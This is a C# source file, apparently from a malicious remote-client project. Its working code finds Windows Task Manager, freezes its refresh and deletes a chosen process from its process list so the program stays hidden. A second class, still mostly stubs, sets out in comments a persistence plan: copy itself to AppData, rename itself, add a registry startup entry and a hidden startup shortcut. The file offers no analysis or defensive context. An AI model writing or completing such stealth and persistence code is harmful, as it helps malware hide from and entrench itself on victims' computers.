using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;

namespace Client.API
{
    /// <summary>
    /// Contains classes that are meant to be used through threads.
    /// </summary>
    public class ThreadedAPI
    {
        public static bool IsRunning = true;
        private static readonly Logger _Log = new Logger(Logger.source.CLIENT);

        /// <summary>
        /// Threaded class for handling proccess related things
        /// </summary>
        public class TProcs
        {
            /// <summary>
            /// If the task manager is open, intercept the kernel process call and alter the return value.
            /// </summary>
            /// <param name="processName"></param>
            public static void HideProccess(object processName)
            {
                _Log.Write(Logger.Actions.NEW_THREAD, "Hiding Process: " + processName);

                while (ThreadedAPI.IsRunning)
                {
                    IntPtr TaskMgrAddress = User32.FindWindow(null, "Task Manager");
                    
                    if (TaskMgrAddress != IntPtr.Zero)
                    {
                        _Log.Write(Logger.Actions.INFO, "Detected Task Manager at 0x" + TaskMgrAddress.ToString("X"));
                        if (DeleteProcessFromTaskList(processName))
                        {
                            _Log.Write(Logger.Actions.INFO, "Hidden: " + processName, "OK");
                            break;
                        }
                    }

                    Thread.Sleep(1);
                }
            }

            /// <summary>
            ///     Hides a process from the task manager description tasklist
            /// </summary>
            /// <param name="procName"> The desired process to hide.</param>
             private static bool DeleteProcessFromTaskList(object procName)
            {
                IntPtr lhWndParent = User32.FindWindow(null, "Task Manager");

                IntPtr lhTaskManagerMain = new IntPtr(),
                       lhDirectUIHWND = new IntPtr(),
                       lhSysListView32 = new IntPtr(),
                       lhSysHeader32 = new IntPtr();

                // Get Task manager menus
                IntPtr hMenu = User32.GetMenu(lhWndParent);
                IntPtr hSubMenu = User32.GetSubMenu(hMenu, 2);
                IntPtr hSubSubMenu = User32.GetSubMenu(hSubMenu, 1);

                // Refresh now button
                int refreshNowButton = User32.GetMenuItemID(hSubMenu, 0);

                // Menu items
                List<int> updateNowList = new List<int>
                {
                    User32.GetMenuItemID(hSubSubMenu, 0),
                    User32.GetMenuItemID(hSubSubMenu, 1),
                    User32.GetMenuItemID(hSubSubMenu, 2),
                    User32.GetMenuItemID(hSubSubMenu, 3)
                };


                //Force clicking of the pause
                User32.PostMessage(lhWndParent, User32.WM_COMMAND, updateNowList[3], 0);

                foreach (int button in updateNowList)
                {
                    User32.EnableMenuItem(hMenu, (uint) button, User32.MF_GRAYED);
                }
                User32.EnableMenuItem(hMenu, (uint) refreshNowButton, User32.MF_ENABLED);

                // Start working our way down the UI classes to the listview
                lhTaskManagerMain = User32.FindWindowEx(lhWndParent, lhTaskManagerMain, null, null);
                lhDirectUIHWND = User32.FindWindowEx(lhTaskManagerMain, lhDirectUIHWND, null, null);

                // Step through the task manager inner windows looking for the process lists
                for (int i = 0; i < 7; i++)
                {
                    lhSysListView32 = User32.FindWindowEx(lhDirectUIHWND, lhSysListView32, null, null);

                    if (User32.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
                    {
                        Console.WriteLine(" Found tasklist window at 0x" + lhSysListView32.ToString("X"));
                        lhSysListView32 = User32.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysListView32", null);
                        lhSysHeader32 = User32.FindWindowEx(lhSysListView32, IntPtr.Zero, "SysHeader32", null);
                        break;
                    }
                }

                User32.LockWindowUpdate(lhSysListView32);

                List<Process> proclist = Process.GetProcesses().ToList();
                proclist = proclist.OrderBy(x => x.ProcessName).ToList();

                int index = 0;

                foreach (Process p in proclist)
                {
                    if (p.ProcessName.ToLower() == procName.ToString())
                        index = proclist.IndexOf(p);
                }


                User32.PostMessage(lhWndParent, User32.WM_COMMAND, refreshNowButton, 0); //Refresh
                User32.EnableWindow(lhSysHeader32, false); // Disable sorting

                User32.PostMessage(lhSysListView32, User32.LVM_SORTITEMS, 0, 0); //Sort
                User32.PostMessage(lhSysListView32, User32.LVM_DELETEITEM, index, 0); //Delete

                User32.LockWindowUpdate(IntPtr.Zero);
                User32.PostMessage(lhWndParent, User32.WM_COMMAND, updateNowList[1], 0);

                return true;
            }
        }

        /// <summary>
        /// Threaded class for handling persistence of this application.
        /// </summary>
        public class TPersistence
        {
            private static class AssemblyInfo
            {
                public static readonly Process Proc = Process.GetCurrentProcess();

                public static string NAME = AppDomain.CurrentDomain.FriendlyName,
                                     PATH = AppDomain.CurrentDomain.BaseDirectory,
                                     TaskName = Proc.ProcessName;
            }

            public static bool IsFirstExecution = true;

            public TPersistence()
            {
                // Confirm we're not already running to avoid conflictions.
                if (!IsOnlyInstance())
                {
                    Environment.Exit(1056);
                }

                // Check if this is the first time running the application.
                if (IsFirstExecution)
                {
                    // Create: 
                    //  - Self replicate to appdata
                    //  - Rename self.
                    //  - Registry startup value.
                    //  - Windows startup shortcut
                    //  - Set shortcuts to hidden.
                }
            }

            // Confirms this is the only instance running.
            private bool IsOnlyInstance()
            {
                Process[] processList = Process.GetProcessesByName(AssemblyInfo.Proc.ProcessName);

                if (processList.Length > 1)
                    return false;

                return true;
            }

            // Copys a file to a specified directory.
            private void Copy(string destination)
            {
            }

            // Sets the hidden flag on a file.
            private bool HideFile(string file)
            {
                return true;
            }
        }
    }
}
